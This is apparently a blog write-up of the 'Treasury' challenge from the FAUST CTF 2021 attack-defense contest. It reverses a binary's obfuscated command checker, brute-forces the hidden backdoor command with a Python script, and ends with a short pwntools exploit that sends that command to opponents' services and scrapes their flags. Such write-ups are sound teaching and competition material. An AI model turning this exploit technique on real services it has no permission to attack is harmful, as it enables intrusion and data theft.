---
layout: post
title: "[FAUST CTF 2021] Treasury"
author: Robert Xiao
---

Treasury was a CTF challenge from the Faust CTF 2021 online attack-defense CTF. The Treasury service is a 64-bit Linux binary implementing a simple text-based service, configured to listen on port 6789 on the vulnbox.

## Initial Reversing

The service starts off by printing out a banner:

```
  _                                       
 | |                                      
 | |_ _ __ ___  __ _ ___ _   _ _ __ _   _ 
 | __| '__/ _ \/ _` / __| | | | '__| | | |
 | |_| | |  __/ (_| \__ \ |_| | |  | |_| |
  \__|_|  \___|\__,_|___/\__,_|_|   \__, |
                                     __/ |
                                    |___/ 

Welcome to treasury!
You got so much treasure that you can't
store it all in one vault, but also don't
to worry about keeping track of all the
different ones? Let us worry about
handling those while you focus on getting
more!
```

It then presents a menu:

```
Choose an action:
-> add treasure location
-> view treasure locations
-> update treasure location
-> print logs
-> quit
  > 
```

Interestingly, you choose a menu option by entering the *first* word of the command, e.g. `add`, `view`, `update`, `print`, `quit`.

With IDA, we can decompile `main` to see how it handles the commands:

```c
    __printf_chk(1LL, "\nChoose an action:\n");
    __printf_chk(1LL, "-> add treasure location\n");
    __printf_chk(1LL, "-> view treasure locations\n");
    __printf_chk(1LL, "-> update treasure location\n");
    __printf_chk(1LL, "-> print logs\n");
    __printf_chk(1LL, "-> quit\n");
    __printf_chk(1LL, "  > ");
    fflush(stdout);
    if ( !fgets(input, 18, stdin) )
      break;
    *(&v71 + strlen(input)) = 0;
    if ( !strcmp(input, "quit") )
      goto LABEL_44;
```

So far, pretty simple - get at most 18 bytes, truncate the newline, and check for `quit`. Next:

```c
    v3 = input;
    do
    {
      v4 = *(_DWORD *)v3;
      v3 += 4;
      v5 = ~v4 & (v4 - 0x1010101) & 0x80808080;
    }
    while ( !v5 );
    if ( (~v4 & (v4 - 0x1010101) & 0x8080) == 0 )
      v5 >>= 16;
    if ( (~v4 & (v4 - 0x1010101) & 0x8080) == 0 )
      v3 += 2;
    slen = &v3[-__CFADD__((_BYTE)v5, (_BYTE)v5) - 3] - input;
```

This is pretty ugly, but it is actually just an optimized, inlined `strlen` (which you can recognize from the 0x1010101 and 0x80808080 constants). Hence, the output at the end is just the input length (`slen`).

Things get a little weird at this point:

```c
      v7 = 0x3C % slen;
      v8 = 0x3C % slen;
      if ( !(0x3C % slen) )
      {
        if ( (slen & 8) == 0
          || (v9 = slen & 0xF,
              v10 = (v9 >> 3) ^ (v9 >> 2),
              v11 = v9 ^ (v9 >> 1),
              v7 = (v9 >> 3) ^ v9,
              (((unsigned __int8)v7 | (unsigned __int8)(v11 | v10)) & 1) == 0) )
        {
```

This is rather unexpected. Instead of straightforwardly checking each of the possible strings with e.g. `strcmp`, this is checking to see if the string length is a divisor of 60 (0x3c) - we note that the valid inputs, "add", "view", "update" and "print" all have lengths which fulfill this criteria. There's a lot more weird stuff in this function, including a complicated-looking sequence of SSE instructions.

Skipping forward to the actual command dispatch, we find this:

```c
              switch ( v64 + v32 % 5 )
              {
                case 9uLL:
                  v69 = 0LL;
                  goto op9;
                case 12uLL:
                  v70 = 0;
                  goto opc;
                case 13uLL:
                  v68 = 0;
                  goto opd;
                case 15uLL:
                  v67 = 0;
                  goto opf;
                case 24uLL:
                  v70 = 1;
opc:
                  v67 = v70 + 1;
opf:
                  v68 = v67 + 1;
opd:
                  v69 = (unsigned int)(v68 + 1);
op9:
                  funcs_1986[v69]();
                  break;
                default:
                  goto LABEL_19;
              }
```

This slightly unusual `switch` statement causes `v69` to be an index from 0 to 4, based on the value of the switch expression, which is used to index an array of function pointers. The first four functions correspond exactly to the operations "add", "view", "update" and "print": `add` lets you add a named treasure item, `view` lets you view a treasure item *if you know its name*, `update` is unimplemented, and `print` purports to print the "logs" but does not actually perform this function.

There's a fifth function in the table which opens the `.log` file and actually does list all the treasure items! This is a kind of "backdoor". But, the command used to access this function is not listed in the menu. So, the goal is to figure out the backdoor command and enter it to get flags.

## Reversing the Command Checker

Most of the code in `main` is concerned with checking the input command. There are several checks that must be passed, based on various properties of the input. The code below is simplified from the original IDA output for clarity, with variable names and comments:

```c
v7 = 0x3C % slen;
v8 = 0x3C % slen;
/* input length must be a divisor of 60, i.e. 1, 2, 3, 4, 5, 6, 10, 12, 15 (input length is capped at 17) */
if ( (0x3C % slen) )
  goto LABEL_19;

/* either the 8 bit of the length is not set (allowing 1, 2, 3, 4, 5, 6), or
   all of the least significant 4 bits are equal (allowing 15) */
if ( ! ((slen & 8) == 0
  || (v9 = slen & 0xF,
      v10 = (v9 >> 3) ^ (v9 >> 2),
      v11 = v9 ^ (v9 >> 1),
      v7 = (v9 >> 3) ^ v9,
      (((unsigned __int8)v7 | (unsigned __int8)(v11 | v10)) & 1) == 0) ))
  goto LABEL_19;

/* calculate the xor-reduction, and-reduction, byte sum and partial byte sum of the input */
xsumhalf = 0LL;
xsum = 0LL;
v14 = 0;
xxor = 0;
xand = -1;
v7 = 0LL;
slen_over_3 = slen / 3;
while ( v14 < slen )
{
  inch = input[v7];
  xsum += inch;
  if ( slen_over_3 > v7 )
    xsumhalf += inch;
  xand &= inch;
  xxor ^= inch;
  /* reject anything that isn't a lowercase letter */
  if ( (unsigned __int8)(inch - 'a') > 0x19u )
    goto LABEL_19;
  v7 = ++v14;
}

/* reject if (xsum % 5) is 0 or 4 */
v7 = xsum / 5;
if ( ((xsum % 5) & ~4uLL) == 0 )
  goto LABEL_19;
/* pass only if (xsumhalf % 7) is 0, 5, 1 or 6 */
v7 = xsumhalf % 7 / 5;
if ( xsumhalf % 7 != 5 * v7 && xsumhalf % 7 % 5 != 1 )
  goto LABEL_19;
v19 = xxor % 5u;
v20 = v19;
/* pass only if xxor is 2 or 3 */
if ( (unsigned __int8)(v19 - 2) > 1u )
  goto LABEL_19;
if ( slen > 8 )
{
  /* special check for slen = 15: first third, second third and third third of the input are all equal (i.e. "abcdeabcdeabcde") */
  v21 = (unsigned int)(2 * slen_over_3);
  i = 0LL;
  mid1 = &input[slen_over_3];
  mid2 = &input[v21];
  do
  {
    v7 = (unsigned __int8)input[i];
    if ( (_BYTE)v7 != mid1[i] || (_BYTE)v7 != mid2[i] )
      goto LABEL_19;
  }
  while ( (unsigned int)(slen / 3) > (unsigned int)++i );
}
if ( slen - 16 > 0xFFFFFFEF )
{
  /* non-optimized routine for less than 16 bytes */
  v65 = 0;
  xmul = 1LL;
  do
  {
    v66 = input[v8];
    v8 = ++v65;
    xmul *= v66;
  }
  while ( slen > v65 );
}
else
{
  /* optimized routine for >= 16 bytes: we can ignore this branch */
  v25 = _mm_load_si128((const __m128i *)input);
  v26 = _mm_cmpgt_epi8((__m128i)0LL, v25);
  v27 = _mm_unpacklo_epi8(v25, v26);
  v28 = _mm_unpackhi_epi8(v25, v26);
  v29 = _mm_cmpgt_epi16((__m128i)0LL, v27);
  v30 = _mm_cmpgt_epi16((__m128i)0LL, v28);
  v31 = _mm_unpacklo_epi16(v27, v29);
  v32 = _mm_unpackhi_epi16(v27, v29);
  v33 = _mm_unpacklo_epi16(v28, v30);
  v34 = _mm_unpackhi_epi16(v28, v30);
  v35 = _mm_cmpgt_epi32((__m128i)0LL, v32);
  v36 = _mm_cmpgt_epi32((__m128i)0LL, v31);
  v37 = _mm_unpacklo_epi32(v32, v35);
  v38 = _mm_unpackhi_epi32(v31, v36);
  v39 = _mm_mul_epu32(_mm_srli_epi64(v38, 0x20u), v37);
  v40 = _mm_mul_epu32(_mm_srli_epi64(v37, 0x20u), v38);
  v41 = _mm_mul_epu32(v37, v38);
  v42 = _mm_cmpgt_epi32((__m128i)0LL, v33);
  v43 = _mm_cmpgt_epi32((__m128i)0LL, v34);
  v44 = _mm_slli_epi64(_mm_add_epi64(v40, v39), 0x20u);
  v45 = _mm_unpackhi_epi32(v32, v35);
  v46 = _mm_add_epi64(v44, v41);
  v47 = _mm_unpacklo_epi32(v33, v42);
  v48 = _mm_add_epi64(
          _mm_mul_epu32(v47, v45),
          _mm_slli_epi64(
            _mm_add_epi64(
              _mm_mul_epu32(_mm_srli_epi64(v47, 0x20u), v45),
              _mm_mul_epu32(_mm_srli_epi64(v45, 0x20u), v47)),
            0x20u));
  v49 = _mm_mul_epu32(v46, v48);
  v50 = _mm_slli_epi64(
          _mm_add_epi64(
            _mm_mul_epu32(_mm_srli_epi64(v46, 0x20u), v48),
            _mm_mul_epu32(v46, _mm_srli_epi64(v48, 0x20u))),
          0x20u);
  v51 = _mm_unpackhi_epi32(v33, v42);
  v52 = _mm_add_epi64(v50, v49);
  v53 = _mm_unpacklo_epi32(v34, v43);
  v54 = _mm_unpackhi_epi32(v34, v43);
  v55 = _mm_unpacklo_epi32(v31, v36);
  v56 = _mm_add_epi64(
          _mm_mul_epu32(v53, v51),
          _mm_slli_epi64(
            _mm_add_epi64(
              _mm_mul_epu32(_mm_srli_epi64(v53, 0x20u), v51),
              _mm_mul_epu32(_mm_srli_epi64(v51, 0x20u), v53)),
            0x20u));
  v57 = _mm_add_epi64(
          _mm_slli_epi64(
            _mm_add_epi64(
              _mm_mul_epu32(_mm_srli_epi64(v52, 0x20u), v56),
              _mm_mul_epu32(v52, _mm_srli_epi64(v56, 0x20u))),
            0x20u),
          _mm_mul_epu32(v52, v56));
  v58 = _mm_add_epi64(
          _mm_mul_epu32(v54, v55),
          _mm_slli_epi64(
            _mm_add_epi64(
              _mm_mul_epu32(_mm_srli_epi64(v54, 0x20u), v55),
              _mm_mul_epu32(v54, _mm_srli_epi64(v55, 0x20u))),
            0x20u));
  v59 = _mm_add_epi64(
          _mm_mul_epu32(v57, v58),
          _mm_slli_epi64(
            _mm_add_epi64(
              _mm_mul_epu32(_mm_srli_epi64(v57, 0x20u), v58),
              _mm_mul_epu32(v57, _mm_srli_epi64(v58, 0x20u))),
            0x20u));
  v60 = _mm_srli_si128(v59, 8);
  v61 = _mm_add_epi64(
          _mm_slli_epi64(
            _mm_add_epi64(
              _mm_mul_epu32(_mm_srli_epi64(v59, 0x20u), v60),
              _mm_mul_epu32(v59, _mm_srli_epi64(v60, 0x20u))),
            0x20u),
          _mm_mul_epu32(v59, v60)).m128i_u64[0];
  xmul = v61;
  if ( slen != 16 )
    xmul = input[16] * v61;
}

v7 = (0x2492492492492493LL * (unsigned __int128)xmul) >> 64;
v8 = xmul % 7;

/* require that xmul % 7 is 0, 1 or 3 */
if ( xmul != 7 * (xmul / 7) )
{
  v8 = (v8 & ~2uLL) - 1;
  if ( v8 )
    goto LABEL_19;
}

/* require that xand == 0x60 */
if ( xand != 96 )
  goto LABEL_19;
v8 = 7LL;
v7 = xsum % 7;

/* reject if xsum % 7 is 0 or 1 */
LOBYTE(v7) = (xsum % 7) & 6;
/* check xsum+xmul "hash" by input length */
if ( !(_BYTE)v7 || slen == 3 && xsum != 297 )
  goto LABEL_19;
switch ( slen )
{
  case 4uLL:
    if ( xsum != 443 || xmul != 0x8E044D2 )
      goto LABEL_19;
    break;
  case 5uLL:
    if ( xsum != 557 || xmul != 0x3FBA17D00LL )
      goto LABEL_19;
    break;
  case 6uLL:
    if ( xsum != 643 || xmul != 0x15ABBA2EB00LL )
      goto LABEL_19;
    break;
  default:
    /* for length 15, input is of the form "m..e." ... */
    if ( slen > 6 && (input[0] != 'm' || input[3] != 'e') )
      goto LABEL_19;
    break;
}
/* final check using xsum % 5 + xsumhalf % 5 + xxor % 5 + xmul % 5 */
v8 = 5LL;
slen += xsum % 5 + xsumhalf % 5;
v64 = slen + v20;
v7 = v64 + xmul % 5 - 9;
switch ( v64 + xmul % 5 )
{
  case 9uLL:
    v69 = 0LL;
    goto op9;
  case 12uLL:
    v70 = 0;
    goto opc;
  case 13uLL:
    v68 = 0;
    goto opd;
  case 15uLL:
    v67 = 0;
    goto opf;
  case 24uLL:
    v70 = 1;
opc:
    v67 = v70 + 1;
opf:
    v68 = v67 + 1;
opd:
    v69 = (unsigned int)(v68 + 1);
op9:
    funcs_1986[v69]();
    break;
  default:
    goto LABEL_19;
}
goto LABEL_2;

LABEL_19:
__printf_chk(1LL, "Invalid command!\n", v7, slen, v8);
```

This is a lot of code! We can see clearly that the code allows for a 15-character command and even has special constraints just for this case, indicating that our backdoor command is probably 15 characters long.

Luckily, the constraints are actually fairly simple, once the code is reversed: in particular, we don't have to touch the big SSE mess in the middle because an unoptimized loop is sitting next to it. Summarized, here are the constraints:

- `(xsum % 5)` in (1, 2, 3) (sum of all bytes in the command)
- `(xsumhalf % 7)` in (0, 1, 5, 6) (sum of the first third of the bytes)
- `(xxor % 5)` in (2, 3) (xor of all the bytes)
- if slen > 8:
    - first third of the chars need to be equal to the second and third thirds
- `xand == 0x60` (and of all the bytes and -1)
- `(xmul % 7)` in (0, 1, 3) (product of all bytes in the command)
- `(xsum % 7)` in (2, 3, 4, 5, 6)

Because of the requirement that the first, second and third parts of the command must all be equal, there are not a lot of possible commands. It's easy to convert this into a little script to test all possibilities. This uses the [`fixedint`](https://pypi.org/project/fixedint/) package to implement proper signed 64-bit multiplication in Python.

```python
from itertools import product, count
from functools import reduce
import random
import fixedint

alphabet = [ord(c) for c in "abcdefghijklmnopqrstuvwxyz"]

for x in product(alphabet, repeat=3):
    msg = bytes([ord('m'), x[0], x[1], ord('e'), x[2]] * 3)

    xsum = sum(msg)
    xsumhalf = sum(msg[:5])
    xxor = reduce(lambda x, y: x ^ y, msg, 0)
    xmul = reduce(lambda x, y: x * y, msg, fixedint.Int64(1))
    xand = reduce(lambda x, y: x & y, msg, 0xff)
    if ((xsum % 5) in (1, 2, 3) and
        (xsumhalf % 7) in (0, 1, 5, 6) and
        (xxor % 5) in (2, 3) and
        (xand == 0x60) and
        (xmul % 7) in (0, 1, 3) and
        (xsum % 7) in (2, 3, 4, 5, 6) and
        (len(msg) + xsum % 5 + xsumhalf % 5 + xxor % 5 + xmul % 5) == 24):
        print(msg)
```

This script spits out 99 possible commands. Not all of them actually trigger the backdoor, presumably due to differences in how Python and C handle negative modulo, but one input picked at random does in fact trigger the backdoor: `mpteympteymptey`.

So, the exploit is therefore quite straightforward to write:

```python
import sys
from pwn import *
import re

ip_addr = sys.argv[1]

s = remote(ip_addr, 6789)
s.recvuntil('  > ')
s.sendline('mpteympteymptey')

flags = s.recvuntil('That\'s it!')
flags = re.findall(rb'FAUST_[A-Za-z0-9/+]{32}', flags)
flags = [flag.decode() for flag in flags]
for flag in flags:
    print(flag)
```

That's enough to get to get first blood! Unfortunately, this is also pretty much trivially reflectable by anyone paying attention to their incoming traffic, and there's not much we can do to obfuscate this exploit, so we just decided to throw it quickly and hope to get a round or two before people started copying the exploit.
